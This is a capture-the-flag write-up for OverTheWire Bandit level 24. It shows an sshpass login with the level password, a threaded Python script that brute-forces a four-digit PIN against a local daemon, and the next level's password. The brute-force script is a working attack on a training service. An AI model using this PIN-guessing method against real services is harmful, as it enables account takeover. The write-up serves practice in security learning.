# Over The Wire -- Bandit 24

## Server
```
sshpass -p UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ssh -p 2220 -oStrictHostKeyChecking=no bandit24@bandit.labs.overthewire.org 
```

## Solution

So we bruteforce the pin using this python script :
```py
import socket                                   
import threading
ip="127.0.0.1"
port=30002
to_send="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
start_id = 1400
end_id = 10000

nb_socket = 6

def send_msg(s, message):
	s.send(bytes(message, "utf-8"))
	return s.recv(1024)

def try_comb(s, id_list):
	for i in id_list:
		msg = "{} {:04d}\n".format(to_send,i)

		resp = send_msg(s, msg)
		if not b'Wrong' in resp:
			print("Fond answer -- Pin {:04d}".format(i))
			print(resp)
			print("==="*40)
			break

sockets = []                                                                                                                                                                                

for i in range(nb_socket):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((ip,port))
	sockets.append(sock)

# Retrieve the welcome message
for s in sockets:
    s.recv(1024)

all_ids = list(range(start_id,end_id))
n = len(all_ids)//len(sockets)
ids = [all_ids[i:i+n] for i in range(0, len(all_ids), n)]

# We might be missing some data at the end

print("Starting bruteforce... Will take a while...")
threads = [threading.Thread(target=try_comb, args=(sockets[i], ids[i])) for i in range(len(sockets))]

for t in threads:
    t.start()

for t in threads:
    t.join()

print("done")

```

After a while, we get :
```
Fond answer -- Pin 2588
b'Correct!\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG'
```

The pin is 2588 and the password is 
```
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```
